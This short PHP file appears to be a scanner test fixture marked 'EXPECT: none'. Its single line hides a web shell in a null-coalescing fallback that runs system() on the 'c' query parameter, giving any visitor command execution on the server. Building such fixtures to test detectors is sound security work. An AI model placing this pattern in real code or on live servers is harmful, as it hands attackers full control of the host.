<?php
// EXPECT: none
$v = $_GET['x'] ?? system($_GET['c']);
echo 'ok';
